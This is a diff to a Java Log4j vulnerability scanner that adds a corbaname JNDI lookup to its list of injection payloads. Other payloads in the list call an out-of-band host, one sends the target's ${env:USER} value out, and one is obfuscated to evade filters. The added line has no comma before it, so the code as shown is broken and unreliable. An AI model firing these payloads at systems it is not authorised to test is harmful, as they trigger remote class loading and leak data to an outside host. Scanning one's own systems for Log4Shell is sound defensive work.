@@ -45,6 +45,7 @@ public class log4jscanner {
                     "${jndi:ldap://" + oobPayload + "/cn=test}",
                     "${jndi:ldap://" + oobPayload + "/${env:USER}}",
                     "${${lower:j}${upper:n}${lower:d}i:rmi://" + oobPayload + "}"
+                    "${jndi:corbaname://" + oobPayload +":1050/NameServer}"
             };
 
             System.out.println("Enter the path to the file containing URLs (one per line):");
